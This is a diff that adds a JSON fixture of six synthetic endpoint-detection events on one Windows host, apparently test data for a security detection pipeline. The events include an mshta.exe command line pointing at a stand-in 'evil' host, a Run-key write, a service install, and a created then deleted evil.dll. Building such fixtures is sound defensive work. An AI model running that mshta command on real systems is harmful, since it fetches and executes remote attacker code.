@@ -1,0 +1,78 @@
+[
+  {
+    "id": "aid-123:ProcessRollup2",
+    "time": "2026-02-06T12:45:00Z",
+    "host": "win-03",
+    "user": "kim",
+    "type": "lolbin_execution",
+    "details": {
+      "CommandLine": "mshta.exe http://evil",
+      "aid": "aid-123",
+      "aip": "10.0.0.20"
+    }
+  },
+  {
+    "id": "aid-123:RegistryValueSet",
+    "time": "2026-02-06T12:46:00Z",
+    "host": "win-03",
+    "user": "kim",
+    "type": "registry_run_key",
+    "details": {
+      "RegistryKey": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "aid": "aid-123",
+      "aip": "10.0.0.20"
+    }
+  },
+  {
+    "id": "aid-123:ServiceInstalled",
+    "time": "2026-02-06T12:47:00Z",
+    "host": "win-03",
+    "user": "kim",
+    "type": "service_install",
+    "details": {
+      "ServiceFileName": "C:\\\\Program Files\\\\Updater\\\\upd.exe",
+      "ServiceName": "Updater",
+      "aid": "aid-123",
+      "aip": "10.0.0.20"
+    }
+  },
+  {
+    "id": "aid-123:FileCreateInfo",
+    "time": "2026-02-06T12:48:00Z",
+    "host": "win-03",
+    "user": "kim",
+    "type": "file_create",
+    "details": {
+      "FileName": "evil.dll",
+      "FilePath": "C:\\\\Temp\\\\evil.dll",
+      "aid": "aid-123",
+      "aip": "10.0.0.20"
+    }
+  },
+  {
+    "id": "aid-123:FileWriteInfo",
+    "time": "2026-02-06T12:49:00Z",
+    "host": "win-03",
+    "user": "kim",
+    "type": "file_modify",
+    "details": {
+      "FileName": "evil.dll",
+      "FilePath": "C:\\\\Temp\\\\evil.dll",
+      "aid": "aid-123",
+      "aip": "10.0.0.20"
+    }
+  },
+  {
+    "id": "aid-123:FileDeleteInfo",
+    "time": "2026-02-06T12:50:00Z",
+    "host": "win-03",
+    "user": "kim",
+    "type": "file_delete",
+    "details": {
+      "FileName": "evil.dll",
+      "FilePath": "C:\\\\Temp\\\\evil.dll",
+      "aid": "aid-123",
+      "aip": "10.0.0.20"
+    }
+  }
+]
